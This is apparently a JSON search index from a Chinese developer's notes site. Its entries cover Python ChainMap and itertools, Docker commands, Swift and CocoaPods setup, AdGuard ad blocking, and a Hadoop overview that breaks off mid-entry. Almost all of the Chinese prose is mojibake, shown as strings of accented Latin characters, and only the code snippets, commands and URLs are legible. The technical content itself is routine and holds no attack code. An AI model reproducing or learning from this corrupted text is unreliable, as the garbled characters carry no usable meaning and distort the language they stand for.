æ¥å—å¤šä¸ªå­—å…¸å¹¶å°†å®ƒä»¬åœ¨é€»è¾‘ä¸Šå˜ä¸ºä¸€ä¸ªå­—å…¸ã€‚ ç„¶åï¼Œè¿™äº›å­—å…¸å¹¶ ä¸æ˜¯çœŸçš„åˆå¹¶åœ¨ä¸€èµ·äº†ï¼ŒChainMap ç±»åªæ˜¯åœ¨å†…éƒ¨åˆ›å»ºäº†ä¸€ä¸ªå®¹çº³è¿™äº›å­—å…¸çš„åˆ—è¡¨å¹¶é‡ æ–°å®šä¹‰äº†ä¸€äº›å¸¸è§çš„å­—å…¸æ“ä½œæ¥éå†è¿™ä¸ªåˆ—è¡¨ã€‚ å¤§éƒ¨åˆ†å­—å…¸æ“ä½œéƒ½æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œ æ¯”å¦‚: å¦‚æœå‡ºç°é‡å¤é”®ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡å‡ºç°çš„æ˜ å°„å€¼ä¼šè¢«è¿”å›ã€‚ å› æ­¤ï¼Œä¾‹å­ç¨‹åºä¸­çš„ c['z'] æ€»æ˜¯ä¼šè¿”å›å­—å…¸ a ä¸­å¯¹åº”çš„å€¼ï¼Œè€Œä¸æ˜¯ b ä¸­å¯¹åº”çš„å€¼ã€‚ å¯¹äºå­—å…¸çš„æ›´æ–°æˆ–åˆ é™¤æ“ä½œæ€»æ˜¯å½±å“çš„æ˜¯åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå­—å…¸ã€‚æ¯”å¦‚: >>> c['z'] = 10 >>> c['w'] = 40 >>> del c['x'] >>> a {'w': 40, 'z': 10} >>> del c['y'] Traceback (most recent call last): ... KeyError: \"Key not found in the first mapping: 'y'\" >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Collections.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Collections.html"},{"title":"itertools","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/itertools.html groupby æ ¹æ®æŸä¸ªè®°å½•åˆ†ç»„: rows = [ {'address': '5412 N CLARK', 'date': '07/01/2012'}, {'address': '5148 N CLARK', 'date': '07/04/2012'}, {'address': '5800 E 58TH', 'date': '07/02/2012'}, {'address': '2122 N CLARK', 'date': '07/03/2012'}, {'address': '5645 N RAVENSWOOD', 'date': '07/02/2012'}, {'address': '1060 W ADDISON', 'date': '07/02/2012'}, {'address': '4801 N BROADWAY', 'date': '07/01/2012'}, {'address': '1039 W GRANVILLE', 'date': '07/04/2012'}, ] æ ¹æ®æ—¥æœŸåˆ†ç»„: from operator import itemgetter from itertools import groupby # Sort by the desired field first rows.sort(key=itemgetter('date')) # Iterate in groups for date, items in groupby(rows, key=itemgetter('date')): print(date) for i in items: print(' ', i) ä¸€ä¸ªéå¸¸é‡è¦çš„å‡†å¤‡æ­¥éª¤æ˜¯è¦æ ¹æ®æŒ‡å®šçš„å­—æ®µå°†æ•°æ®æ’åºã€‚ å› ä¸º groupby() ä»…ä»… æ£€æŸ¥è¿ç»­çš„å…ƒç´ ï¼Œå¦‚æœäº‹å…ˆå¹¶æ²¡æœ‰æ’åºå®Œæˆçš„è¯ï¼Œåˆ†ç»„å‡½æ•°å°†å¾—ä¸åˆ°æƒ³è¦çš„ç»“æœã€‚ compress itertools.compress ä»¥ä¸€ä¸ª iterable å¯¹è±¡å’Œä¸€ä¸ªç›¸å¯¹åº”çš„Booleané€‰æ‹©å™¨åºåˆ—ä½œä¸ºè¾“å…¥å‚æ•°ã€‚ ç„¶åè¾“å‡ºiterableå¯¹è±¡ä¸­å¯¹ åº”é€‰æ‹©å™¨ä¸º True çš„å…ƒç´ : addresses = [ '5412 N CLARK', '5148 N CLARK', '5800 E 58TH', '2122 N CLARK', '5645 N RAVENSWOOD', '1060 W ADDISON', '4801 N BROADWAY', '1039 W GRANVILLE', ] counts = [ 0, 3, 10, 4, 1, 7, 6, 1] æ“ä½œ: >>> from itertools import compress >>> more5 = [n > 5 for n in counts] >>> more5 [False, False, True, False, False, True, True, False] >>> list(compress(addresses, more5)) ['5800 E 58TH', '1060 W ADDISON', '4801 N BROADWAY'] >>> å…³é”®ç‚¹åœ¨äºå…ˆåˆ›å»ºä¸€ä¸ª Boolean åºåˆ—ï¼ŒæŒ‡ç¤ºå“ªäº›å…ƒç´ ç¬¦åˆæ¡ä»¶ã€‚ ç„¶å compress() å‡½æ•°æ ¹æ®è¿™ä¸ªåºåˆ—å»é€‰æ‹©è¾“å‡ºå¯¹åº”ä½ç½®ä¸º True çš„å…ƒç´ ã€‚ å’Œ filter() å‡½æ•°ç±»ä¼¼ï¼Œcompress() ä¹Ÿæ˜¯è¿”å›çš„ä¸€ä¸ªè¿­ä»£å™¨ã€‚ permutations æ’åˆ—å‡½æ•°, æ¯”å¦‚è·å–æŸä¸ªè¿­ä»£çš„å…¨æ’åˆ— å¦‚, ä»numä¸­æŠ½2ä¸ªè·å–å…¨æ’åˆ—: permutations('ABCD', 2) ç»“æœ: AB AC AD BA BC BD CA CB CD DA DB DC combinations ç»„åˆå‡½æ•°, ä»æŸä¸ªè¿­ä»£ä¸­æŠ½å–æŒ‡å®šçš„ä¸é‡å¤å…ƒç´ ä¸ªæ•°ç»„åˆ å¦‚, ä»numä¸­æŠ½2ä¸ªç»„åˆ(ä¸é‡å¤): combinations('ABCD', 2) AB AC AD BC BD CD combinations_with_replacement ç»„åˆå‡½æ•°, ä»æŸä¸ªè¿­ä»£ä¸­æŠ½å–æŒ‡å®šçš„é‡å¤å…ƒç´ ä¸ªæ•°ç»„åˆ å¦‚, ä»numä¸­æŠ½2ä¸ªç»„åˆ(å¯é‡å¤): combinations_with_replacement('ABCD', 2) AA AB AC AD BB BC BD CC CD DD zip_longest ä¸ zip ç±»ä¼¼, ä¸è¿‡ zip è¿”å›çš„ç»“æœä»¥æœ€çŸ­çš„åºåˆ—ä¸ºå‡†, zip_longestä»¥æœ€é•¿çš„åºåˆ—ä¸ºå‡†: In [18]: from itertools import zip_longest In [19]: list(zip('ABC', range(5), [10, 20, 30, 40])) Out[19]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30)] In [20]: list(zip_longest('ABC', range(5), [10, 20, 30, 40])) Out[20]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30), (None, 3, 40), (None, 4, None)] In [21]: starmap ä¹˜æ³•è¿ç®—ç¬¦å¯ä»¥è¢«æ˜ å°„åˆ°ä¸¤ä¸ªå‘é‡ä¹‹é—´æ‰§è¡Œé«˜æ•ˆçš„ç‚¹ç§¯: sum(starmap(operator.mul, zip(vec1, vec2, strict=True)))ã€‚ æ³¨è§£ operator è§ operator å†å¦‚ç»Ÿè®¡ä¸¤ä¸ªæ•°ç»„a, bä¸­ç´¢å¼•ä¸å…ƒç´ éƒ½ç›¸ç­‰çš„ä¸ªæ•°: starmap(operator.eq, zip(a, b))","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Itertools.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Itertools.html"},{"title":"dockerå¸¸ç”¨æŒ‡ä»¤","text":"docker_command å…¶å®ƒ # ç™»å½•ç§æœ‰åœ°å€, å¯åŠ  --username= æŒ‡å®šç”¨æˆ·å, ç„¶åæ‰‹åŠ¨è¾“å…¥å¯†ç  docker login $address # cat ~/.docker/config.json éªŒè¯æ˜¯å¦æˆåŠŸ, æˆåŠŸç™»å½•æœ‰ auths é…ç½® # æ‹‰å–é•œåƒ, å…¬å…±ä»“åº“ç”¨é•œåƒåå­—, ç§æœ‰ä»“åº“ç”¨åœ°å€ååŠ é•œåƒåå­— docker pull $image_name # ä¸Šä¼ é•œåƒ, å…¬å…±ä»“åº“ä¸ç”¨åœ°å€ç›´æ¥é•œåƒåå³å¯ docker push $address $image_name # æŸ¥çœ‹å·²ä¸‹è½½é•œåƒ docker images # è¿è¡Œä¸€ä¸ªå®¹å™¨, è‹¥ä¸å­˜åœ¨è‡ªåŠ¨ä»å®˜ç½‘æ‹‰å– # -d åå°è¿è¡Œ # -p åè·Ÿç«¯å£ port1:port2 å°†å®¹å™¨å†…éƒ¨æœåŠ¡å™¨ç«¯å£port2æ˜ å°„åˆ°æœ¬åœ°ç«¯å£port1(å¦‚æœ-påä»€ä¹ˆä¹Ÿä¸å†™ï¼Œéšæœºåˆ†é…ç«¯å£) # --rm å®¹å™¨åœæ­¢ä¹‹åä¼šè‡ªåŠ¨åˆ é™¤ docker run $image_name # æœç´¢é•œåƒ docker search $image_name # æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ # ps æŸ¥çœ‹è¿è¡Œä¸­çš„docker docker ps -a # åˆ é™¤å®¹å™¨ docker rm å®¹å™¨id # å¯åŠ¨å®¹å™¨ docker start å®¹å™¨id # åœæ­¢æ‰€æœ‰å®¹å™¨ docker stop $( docker ps -a -q ) # removeåˆ é™¤æ‰€æœ‰å®¹å™¨ docker rm $( docker ps -a -q ) # é‡å¯å®¹å™¨ docker restart $image_name # æŸ¥çœ‹æ—¥å¿—, å¦‚æŸ¥çœ‹mysqlæ—¥å¿— docker logs -f mysql57 # è¿›å…¥å®¹å™¨, å¦‚è¿›å…¥mysqlå®¹å™¨ # -t åœ¨å®¹å™¨é‡Œç”Ÿäº§ä¸€ä¸ªä¼ªç»ˆç«¯ # -i å¯¹å®¹å™¨å†…çš„æ ‡å‡†è¾“å…¥ (STDIN) è¿›è¡Œäº¤äº’ docker exec -ti mysql57 /bin/bash # æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ docker inspect $image_name # ä¾‹å­ docker run -p 3306 :3306 --name mysql57 \\ -v $PWD /conf:/etc/mysql \\ -v $PWD /logs:/var/log/mysql \\ -v $PWD /data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD = 123456 \\ -d mysql:5.7 \\ --character-set-server = utf8mb4 \\ --collation-server = utf8mb4_unicode_ci # å‚æ•°é€‰é¡¹ â€“nameï¼šå®¹å™¨å, æ¯”å¦‚mysql57 -vï¼šæŒ‚è½½ç›®å½• -eï¼šé…ç½®ä¿¡æ¯, æ¯”å¦‚é…ç½®mysqlçš„rootç”¨æˆ·çš„ç™»é™†å¯†ç  -pï¼šç«¯å£æ˜ å°„, æ¯”å¦‚æ˜ å°„ ä¸»æœº3306ç«¯å£ åˆ° å®¹å™¨çš„3306ç«¯å£ -dï¼šæºé•œåƒå, æ¯”å¦‚ä¸º mysql:5.7å¹¶åå°è¿è¡Œ åé¢ä¸ºè®¾ç½®mysqlçš„é»˜è®¤ç¼–ç ","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html"},{"title":"Dockerå‘½ä»¤å¤§å…¨","text":"å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç† å®¹å™¨æ“ä½œ æœ¬åœ°é•œåƒç®¡ç† é•œåƒä»“åº“ å®¹å™¨rootfså‘½ä»¤ info_version","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-index.html"},{"title":"swift","text":"å®˜ç½‘: https://www.swift.org å®˜ç½‘APIæ–‡æ¡£: https://developer.apple.com/documentation/technologies å®˜ç½‘æ•™ç¨‹åªæœ‰è‹±æ–‡ ä¸€ä¸ªç”¨äºåœ¨Appleè®¾å¤‡ä¸Šå¼€å‘çš„è¯­è¨€ ç°åœ¨åŸºæœ¬æ˜¯ Object-C åçš„æ¥æ›¿äº† å®‰è£… Macä¸Šç›´æ¥å®‰è£…Xcodeå°±è¡Œäº†, è‡ªå¸¦Swift. å…¶ä»–å¹³å°å¯å‚è€ƒ: https://www.swift.org/install/ Swiftå†…ç½®äº†ä¸€ä¸ªåŒ…ç®¡ç†, èƒ½å¤Ÿæ›´ç®€å•çš„å¯¼å…¥, åŒ…ç´¢å¼•æŸ¥è¯¢: https://swiftpackageindex.com ä¸€äº›ç½‘ç«™ æ°‘é—´(NGO, Non-Governmental Organization)ä¸­æ–‡ç¤¾åŒº: https://swiftgg.team æ°‘é—´Swiftè¯­æ³•ä¸­æ–‡ç‰ˆ(ç›¸å¯¹æ›´æ–°æ…¢ä¸€ç‚¹): https://gitbook.swiftgg.team/swift/ æ°‘é—´Swift åŸºæœ¬çº¦å®šè¯‘æ–‡: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese æ³¨è§£ swift å‘æ¯”è¾ƒå¤š, èµ„æ–™ä¹Ÿæ¯”è¾ƒå°‘... æ‰“ç®—åšä¸€ä¸ªå¿«æ·é”®çš„, ä¸œè¥¿å¤ªå°‘ æ‰¾åˆ°ä¸ªå¯ä»¥å€Ÿé‰´çš„é¡¹ç›®: git clone https://github.com/tkgka/Switcher.git gitåœ°å€: https://github.com/tkgka/Switcher æ³¨è§£ å›½å†…NGOå°±æ˜¯ç¤¾ä¼šç»„ç»‡ è®¿é—®Cå¤´æ–‡ä»¶çš„å‡ ç§æ–¹å¼ å¤‡æ³¨ å¯¹äºMacOS è¦ä½¿Appå…¨å±€æ˜¾ç¤º, åªæœ‰è®¾ç½® Info ä¸º Application is agent (UIElement) , æ¯”å¦‚æ˜¾ç¤ºåœ¨å…¶ä»–å…¨å±Appä¸Š. è¿™æ˜¯ç”¨å…¶ä»–è¯­è¨€æš‚æ—¶æ— æ³•å®ç°çš„... å•ç‹¬çš„ Swift-View å¦‚æœè¦ä½œä¸ºä¸€ä¸ªå¼¹å‡ºçª—ä½“, éœ€è¦è½¬æ¢ä¸º NSWindow å¯¹äºå•ç‹¬çš„ NSWindow , ç›´æ¥ç»™ delegate ä¼šå­˜åœ¨é—®é¢˜... æœ‰ä¸ªä¸€ç›´æœªè§£å†³çš„é—®é¢˜, æœ¬åœ°æ„å»ºçš„App, é‡æ–°æ„å»ºå, è¯†åˆ«ä¸äº†ä¸Šä¸ªç‰ˆæœ¬è·å–çš„æƒé™, æ¯”å¦‚è¾…åŠ©åŠŸèƒ½...","tags":"åç«¯; swift","url":"/yq-backend-swift.html","loc":"/yq-backend-swift.html"},{"title":"swift3.xå‡çº§åˆ°5.x","text":"å…ˆå» App Store ä¸‹è½½ Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 å…ˆæ³¨å†Œ: https://swiftify.com/profile/api-key/ ä¸»è¦æ˜¯è¦è·å–ä¸€ä¸ªAPI KEY é…ç½®: ç³»ç»Ÿåå¥½è®¾ç½® => \"æ‰©å±•\"ä¸­ä¸ºXcode Source Editor(Xcodeæºç ç¼–è¾‘å™¨)é€‰æ‹©\"Swiftyfy for Xcode\" æ‰“å¼€Xcode => Editor => èœå•ä¸‹çœ‹åˆ°æ–°çš„\"Swiftify\"å­èœå• å¥½å§ä¸è¡Œ, å‘, è¿™æ˜¯ object-c => swift çš„","tags":"åç«¯; swift","url":"/yq-backend-swift-issuse-update.html","loc":"/yq-backend-swift-issuse-update.html"},{"title":"åŒ…ç®¡ç†å·¥å…·pod(cocoapods)","text":"å‚è€ƒ: https://juejin.cn/post/6932739864613879821 ç±»ä¼¼äºJavaçš„Maven éœ€è¦å…ˆæœ‰Ruby, å› ä¸ºpodæ˜¯ç”¨Rubyå†™çš„, å®‰è£…: gem install cocoapods pod setup é…ç½®é•œåƒ å‚è€ƒ: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ å†…å®¹: CocoaPods æ˜¯ä¸€ä¸ª Cocoa å’Œ Cocoa Touch æ¡†æ¶çš„ä¾èµ–ç®¡ç†å™¨ï¼Œå…·ä½“åŸç†å’Œ Homebrew æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯ä» GitHub ä¸‹è½½ç´¢å¼•ï¼Œç„¶åæ ¹æ®ç´¢å¼•ä¸‹è½½ä¾èµ–çš„æºä»£ç ã€‚ å¯¹äºæ—§ç‰ˆçš„ CocoaPods å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ä½¿ç”¨ tuna çš„é•œåƒï¼š $ pod repo remove master $ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git # æŠŠæ‰€æœ‰ä¸Šä¼ åˆ°cocoapodsçš„ç¬¬ä¸‰æ–¹æ¡†æ¶ä¸‹è½½æ¯ä¸ªç‰ˆæœ¬å’Œç½‘ç»œåœ°å€ä»¥åŠä¸€äº›å…¶ä»–æè¿°ä¿¡æ¯åˆ°æœ¬åœ° $ pod repo update æ–°ç‰ˆçš„ CocoaPods ä¸å…è®¸ç”¨pod repo addç›´æ¥æ·»åŠ masteråº“äº†ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ï¼š $ cd ~/.cocoapods/repos $ pod repo remove master $ git clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master æœ€åè¿›å…¥è‡ªå·±çš„å·¥ç¨‹ï¼Œåœ¨è‡ªå·±å·¥ç¨‹çš„podFileç¬¬ä¸€è¡ŒåŠ ä¸Šï¼š source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' å…‹éš†é•œåƒæœ‰ç‚¹æ…¢, æˆ‘è¿™èŠ±äº†9åˆ†åŠ Macé»˜è®¤ç¼“å­˜ä½ç½®æ˜¯åœ¨: /Users/ç”¨æˆ·å/.cocoapods/repos åº”è¯¥æ˜¯podè½¬äº†ä¸€éç½‘ç»œçš„åŸå› , å¯¼è‡´githubæ²¡æœ‰èµ°clashçš„ä»£ç†, å…¨å±€ä»£ç†ä¹Ÿæ— æ•ˆ; åªèƒ½æ‰‹åŠ¨é…ç½®ä¸€ä¸‹äº†: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 è¿˜æ²¡è¯•, åé¢è¯•è¯•. é™„, æ¢å¤: git config --global --unset http.proxy å¤åˆ¶ä»£ç  git config --global --unset http.https://github.com.proxy å¤åˆ¶ä»£ç  ä½¿ç”¨ å‘½ä»¤è¡Œæ–¹å¼: pod init æˆ–è€…æ‰‹åŠ¨åˆ›å»º Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' platform :osx, '14.0' use_frameworks! target 'CQ' do pod 'KeyboardShortcuts', '~> 1.16.1' end ç¬¬ä¸€è¡ŒæŒ‡å®šæº åç»­å®‰è£…ç›´æ¥: pod install å³å¯ æ³¨è§£ è¿™é‡Œç”¨çš„ KeyboardShortcuts å‘ç°podä¸Šé¢ç‰ˆæœ¬åªæœ‰ 0.7.1 , å¤ªä½äº†, æ”¾å¼ƒ é‡è¦ ä½¿ç”¨podçš„é¡¹ç›®, ä¸€å®šè¦ä½¿ç”¨ é¡¹ç›®å.xcworkspace æ‰“å¼€, æ‰æ˜¯ pod çš„é…ç½®, å¦åˆ™æ‰¾ä¸åˆ°podå®‰è£…çš„æ¨¡å—","tags":"åç«¯; swift","url":"/yq-backend-swift-pod.html","loc":"/yq-backend-swift-pod.html"},{"title":"å…³äºå¹¿å‘Š","text":"åªè°ˆè¿‘æ¥, å»å¹´ç”¨çš„ä¸‰æ˜Ÿæ‰‹æœº, è™½ç„¶ç³»ç»Ÿå†…å¹¿å‘Šè¾ƒå°‘, ä½†æ˜¯è¿™ä¸¤å¹´çš„ä¸‰æ˜Ÿ, æ²¡æœ‰12Gçš„å°ä½“é‡è¿å­˜, ç„¶åå¯¼è‡´æˆ‘çš„è¿™S22å°±å‘çƒ«, å¡, æ€åå°... ä¸€å¹´å¤šå, ç»ˆäºæ— æ³•å¿å—, åƒæŒ‘ä¸‡é€‰é€‰äº†ä¸ªRedMi K60, 16 + 256, è€Œä¸”ä¸è¶…è¿‡2500å°±èƒ½æ‹¿åˆ°, æ¯”è·³æ°´ç‹ä¸‰æ˜Ÿå¥½å¤šäº†, å°±æ˜¯æ²¡ä¸‰æ˜Ÿå¥½çœ‹. å¦‚æœä¸‰æ˜Ÿä»Šå¹´çš„23æœ‰12Gè¿å­˜ç‰ˆæœ¬å€’æ˜¯å¯èƒ½ä¼šè€ƒè™‘é™ä»·åä¹°... å¯æƒœå·²ç»è¿ç»­å‡ å¹´çš„æ²¡æœ‰äº†... ç„¶åå°±ç†æ‰€å½“ç„¶çš„é­å—äº†å›½äº§å¹¿å‘Šçš„ä¾µæ‰°, æœ€åˆæœ¬æ¥æ‰“ç®—ä»ç½‘ç»œä»£ç†å’Œå®‰å“è·³è½¬ç›‘å¬APIçš„ä¸¤ä¸ªæ–¹å‘æ¥è‡ªå·±å†™ç¨‹åºå¤„ç†, è¿˜ç ”ç©¶äº†ä¸€ä¸‹, æœ€ç»ˆå†³å®šä½¿ç”¨Javaå¼€å‘, å†ä¹‹åç¹å¿™, æ¯”å¦‚å¡å°”è¾¾, æ¯”å¦‚å·¥ä½œå•¥çš„, å°±æç½®. å†ä¹‹åæƒ³ç€, è¿™ç©æ„å„¿ä¸åº”è¯¥åªæœ‰æˆ‘æƒ³è¿‡, æœ‰æ²¡æœ‰å¯ä»¥ç›´æ¥ç”¨çš„ç°æˆè½¯ä»¶? ç„¶åæ‰¾åˆ°äº†AdGuard. AdGuardæä¾›äº†ä¸¤ç§: AdGuard ä¸ªäººç‰ˆä½¿ç”¨, æ”¶è´¹, ä¸ªäººç‰ˆç»ˆèº«è®¸å¯è¯189 AdGuard Home è¿™ä¸ªç¨å¾®ä¸“ä¸šä¸€ç‚¹, å¼€æºå…è´¹, é€‚ç”¨äºå®¶åº­ç½‘ç»œ, å±€åŸŸç½‘, å¯ä»¥ç†è§£ä½œä¸ºä¸€ä¸ªç½‘å…³, ç„¶åå±€åŸŸç½‘è®¾å¤‡å°± ä¸ç”¨é¢å¤–å®‰è£…å…¶ä»–è½¯ä»¶. ä¸è¿‡ç¼ºç‚¹æ˜¯ç½‘å…³è®¾å¤‡éœ€è¦ä¸€ç›´å¼€æœº, è¿™ä¸ªå€’æ˜¯å¯ä»¥è€ƒè™‘ä½¿ç”¨VPSè§£å†³. åœ°å€: https://adguard.com/zh_cn/welcome.html https://adguard.com/zh_cn/adguard-home/overview.html æœ€åˆçœ‹åˆ°è®¨è®ºæ˜¯åœ¨ https://www.zhihu.com/question/482691819 æ³¨è§£ è¿™æ˜¯å±äºé‚£ç§åŸç†ç®€å•ä½†æ˜¯åšèµ·æ¥æ¯”è¾ƒå¤æ‚çš„é‚£ç§, æ¯”å¦‚å¦‚ä½•åˆ¤æ–­å“ªäº›è¯·æ±‚æ˜¯å±äºå¹¿å‘Šè®¿é—®, æ‰€ä»¥æœ‰ç°æˆè½®å­å¯ç”¨ä½•å¿…è‡ªå·±å†å»æ.","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-About-advertising.html","loc":"/yq-doc-source-docs-Chaotic-About-advertising.html"},{"title":"Hadoop","text":"ä¸€ä¸ªåˆ†å¸ƒå¼æ¡†æ¶ï¼Œ è¯¥æ¡†æ¶å…è®¸ä½¿ç”¨ç®€å•çš„ç¼–ç¨‹æ¨¡å‹è·¨è®¡ç®—æœºé›†ç¾¤å¯¹å¤§å‹æ•°æ®é›†è¿›è¡Œåˆ†å¸ƒå¼å¤„ç†ã€‚ å®ƒæ—¨åœ¨ä»å•ä¸ªæœåŠ¡å™¨æ‰©å±•åˆ°æ•°åƒå°æœºå™¨ï¼Œæ¯å°æœºå™¨éƒ½æä¾›æœ¬åœ°è®¡ç®—å’Œå­˜å‚¨ã€‚ åº“æœ¬èº«ä¸ç”¨äºä¾é ç¡¬ä»¶æ¥æä¾›é«˜å¯ç”¨æ€§ï¼Œè€Œæ˜¯è¢«è®¾è®¡ç”¨æ¥æ£€æµ‹å’Œå¤„ç†åº”ç”¨ç¨‹åºå±‚çš„æ•…éšœï¼Œ å› æ­¤å¯ä»¥åœ¨è®¡ç®—æœºé›†ç¾¤çš„é¡¶éƒ¨æä¾›é«˜å¯ç”¨æ€§æœåŠ¡ï¼Œæ¯å°è®¡ç®—æœºéƒ½å®¹æ˜“å‡ºç°æ•…éšœã€‚ æ ¸å¿ƒ HDFS åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ, å¯¹åº”Googleçš„ GFS MapReduce åˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶, å¯¹åº”Googleçš„ MapReduce HBASE å®æ—¶åˆ†å¸ƒå¼æ•°æ®åº“, å¯¹åº”Googleçš„ BigTable HDFSç»“æ„ NameNodeï¼ˆåç§°èŠ‚ç‚¹ï¼‰ DataNodeï¼ˆæ•°æ®èŠ‚ç‚¹ï¼‰ Clientï¼ˆå®¢æˆ·æœºï¼‰ NameNode æ˜¯MasterèŠ‚ç‚¹ï¼ˆä¸»èŠ‚ç‚¹ï¼‰ï¼Œå¯ä»¥çœ‹ä½œæ˜¯åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç®¡ç†è€…ï¼Œ ä¸»è¦è´Ÿè´£ç®¡ç†æ–‡ä»¶ç³»ç»Ÿçš„å‘½åç©ºé—´ã€é›†ç¾¤é…ç½®ä¿¡æ¯å’Œå­˜å‚¨å—çš„å¤åˆ¶ç­‰ã€‚ NameNodeä¼šå°†æ–‡ä»¶ç³»ç»Ÿçš„Meta-dataå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œ è¿™äº›ä¿¡æ¯ä¸»è¦åŒ…æ‹¬äº†æ–‡ä»¶ä¿¡æ¯ã€æ¯ä¸€ä¸ªæ–‡ä»¶å¯¹åº”çš„æ–‡ä»¶å—çš„ä¿¡æ¯å’Œæ¯ä¸€ä¸ªæ–‡ä»¶å—åœ¨DataNodeçš„ä¿¡æ¯ç­‰ã€‚ DataNode æ˜¯SlaveèŠ‚ç‚¹ï¼ˆä»èŠ‚ç‚¹ï¼‰ï¼Œæ˜¯æ–‡ä»¶å­˜å‚¨çš„åŸºæœ¬å•å…ƒï¼Œ å®ƒå°†Blockå­˜å‚¨åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¿å­˜äº†Blockçš„Meta-dataï¼ŒåŒæ—¶å‘¨æœŸæ€§åœ°å°†æ‰€æœ‰å­˜åœ¨çš„Blockä¿¡æ¯å‘é€ç»™NameNodeã€‚ Client åˆ‡åˆ†æ–‡ä»¶ï¼›è®¿é—®HDFSï¼›ä¸NameNodeäº¤äº’ï¼Œè·å¾—æ–‡ä»¶ä½ç½®ä¿¡æ¯ï¼›ä¸DataNodeäº¤äº’ï¼Œè¯»å–å’Œå†™å…¥æ•°æ®ã€‚ è¿˜æœ‰ä¸€ä¸ªBlockï¼ˆå—ï¼‰çš„æ¦‚å¿µï¼šBlockæ˜¯HDFSä¸­çš„åŸºæœ¬è¯»å†™å•å…ƒï¼› HDFSä¸­çš„æ–‡ä»¶éƒ½æ˜¯è¢«åˆ‡å‰²ä¸ºblockï¼ˆå—ï¼‰è¿›è¡Œå­˜å‚¨çš„ï¼› è¿™äº›å—è¢«å¤åˆ¶åˆ°å¤šä¸ªDataNodeä¸­ï¼›å—çš„å¤§å°ï¼ˆé€šå¸¸ä¸º64MBï¼‰å’Œå¤åˆ¶çš„å—æ•°é‡åœ¨åˆ›å»ºæ–‡ä»¶æ—¶ç”±Clientå†³å®šã€‚ MapReduce æ³¨è§£ MapReduce æ˜¯é¢å‘ç£ç›˜çš„ MapReduceå…¶å®æ˜¯ä¸€ç§ç¼–ç¨‹æ¨¡å‹ã€‚è¿™ä¸ªæ¨¡å‹çš„æ ¸å¿ƒæ­¥éª¤ä¸»è¦åˆ†ä¸¤éƒ¨åˆ†ï¼šMapï¼ˆæ˜ å°„ï¼‰å’ŒReduceï¼ˆå½’çº¦ï¼‰ã€‚ å½“ä½ å‘MapReduceæ¡†æ¶æäº¤ä¸€ä¸ªè®¡ç®—ä½œä¸šæ—¶ï¼Œå®ƒä¼šé¦–å…ˆæŠŠè®¡ç®—ä½œä¸šæ‹†åˆ†æˆè‹¥å¹²ä¸ªMapä»»åŠ¡ï¼Œ ç„¶ååˆ†é…åˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šå»æ‰§è¡Œï¼Œæ¯ä¸€ä¸ªMapä»»åŠ¡å¤„ç†è¾“å…¥æ•°æ®ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œ å½“Mapä»»åŠ¡å®Œæˆåï¼Œå®ƒä¼šç”Ÿæˆä¸€äº›ä¸­é—´æ–‡ä»¶ï¼Œè¿™äº›ä¸­é—´æ–‡ä»¶å°†ä¼šä½œä¸ºReduceä»»åŠ¡çš„è¾“å…¥æ•°æ®ã€‚ Reduceä»»åŠ¡çš„ä¸»è¦ç›®æ ‡å°±æ˜¯æŠŠå‰é¢è‹¥å¹²ä¸ªMapçš„è¾“å‡ºæ±‡æ€»åˆ°ä¸€èµ·å¹¶è¾“å‡ºã€‚ åœ¨MapReduceé‡Œï¼Œä¸ºäº†å®Œæˆä¸Šé¢è¿™äº›è¿‡ç¨‹ï¼Œéœ€è¦ä¸¤ä¸ªè§’è‰²ï¼šJobTrackerå’ŒTaskTrackerã€‚ JobTrackerç”¨äºè°ƒåº¦å’Œç®¡ç†å…¶å®ƒçš„TaskTrackerã€‚JobTrackerå¯ä»¥è¿è¡Œäºé›†ç¾¤ä¸­ä»»ä¸€å°è®¡ç®—æœºä¸Šã€‚TaskTracker è´Ÿè´£æ‰§è¡Œä»»åŠ¡ï¼Œå¿…é¡»è¿è¡Œäº DataNode ä¸Šã€‚ ç‰ˆæœ¬å†å² 2011å¹´11æœˆï¼ŒHadoop 